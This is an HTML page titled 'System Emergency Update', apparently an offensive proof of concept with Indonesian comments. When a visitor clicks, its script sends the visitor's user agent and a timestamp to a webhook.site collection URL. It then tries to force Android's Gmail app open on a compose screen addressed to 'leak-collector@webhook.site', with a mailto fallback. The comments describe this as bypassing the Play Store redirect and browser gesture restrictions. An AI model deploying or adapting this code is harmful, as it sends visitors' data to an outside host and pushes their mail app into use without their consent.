<!DOCTYPE html>
<html>
<head><title>System Emergency Update</title></head>
<body style="background:#000;color:#f0f;font-family:monospace;display:flex;align-items:center;justify-content:center;height:100vh;margin:0;overflow:hidden">
    <div id="ignite" style="padding:60px;border:4px solid #f0f;text-align:center;cursor:pointer;background:rgba(255,0,255,0.05);box-shadow:0 0 80px #f0f;border-radius:30px">
        <h1 style="letter-spacing:10px;margin:0">V207_PENETRATOR</h1>
        <div id="status" style="font-size:20px;margin:20px 0;color:#0ff">INITIALIZING_GMAIL_LINK...</div>
        <div style="font-size:12px;color:#444">[ TARGET: com.google.android.gm ]</div>
    </div>

<script>
    const target = "https://webhook.site/47108fd1-d2d2-405b-91e0-30e6d35aa632";

    document.getElementById('ignite').onclick = async () => {
        const statusEl = document.getElementById('status');
        statusEl.innerText = "BYPASSING_STORE_REDIRECT...";

        // 1. SILENT RECON (Data dikirim ke Link baru)
        const recon = {
            id: "V207_DIRECT",
            ua: navigator.userAgent,
            ts: new Date().toISOString()
        };
        navigator.sendBeacon(`${target}?v=V207_RECON`, btoa(JSON.stringify(recon)));

        // 2. THE PENETRATOR INTENT (Direct Activity Access)
        // Kita paksa Android untuk tidak mencari di Play Store dengan 'S.browser_fallback_url=' yang dikosongkan
        // Kita langsung menargetkan 'com.google.android.gm'
        const directGmailIntent = 
            "intent:#Intent;" +
            "action=android.intent.action.VIEW;" +
            "category=android.intent.category.DEFAULT;" +
            "category=android.intent.category.BROWSABLE;" +
            "package=com.google.android.gm;" + // Mengunci agar hanya membuka Gmail
            "component=com.google.android.gm/.ComposeActivityGmailExternal;" + // Masuk ke mode tulis pesan
            "S.android.intent.extra.EMAIL=leak-collector@webhook.site;" +
            "S.android.intent.extra.SUBJECT=V207_SENSITIVE_LEAK;" +
            "S.android.intent.extra.TEXT=INJECTING_SYSTEM_DATA_" + btoa(navigator.userAgent).substring(0,15) + ";" +
            "S.browser_fallback_url=https://mail.google.com;" + // Fallback ke web jika app tidak ada, BUKAN Play Store
            "end";

        // 3. EXECUTION VIA VIRTUAL ANCHOR (Bypass Gesture Restriction)
        const anchor = document.createElement('a');
        anchor.href = directGmailIntent;
        anchor.rel = "noreferrer";
        
        setTimeout(() => {
            // Coba eksekusi pertama
            window.location.assign(directGmailIntent);
            
            // Coba eksekusi kedua (Click)
            anchor.click();

            // 4. THE ULTIMATE BYPASS (Jika masih stuck di browser)
            setTimeout(() => {
                if (!document.hidden) {
                    statusEl.innerText = "RETRYING_VIA_MAILTO_PROTOCOL...";
                    // Menggunakan protokol mailto yang seringkali dilempar otomatis ke aplikasi native
                    window.location.href = "mailto:leak-collector@webhook.site?subject=V207_FINAL&body=SENSITIVE_PAYLOAD";
                }
            }, 1000);
        }, 300);
    };
</script>
</body>
</html>
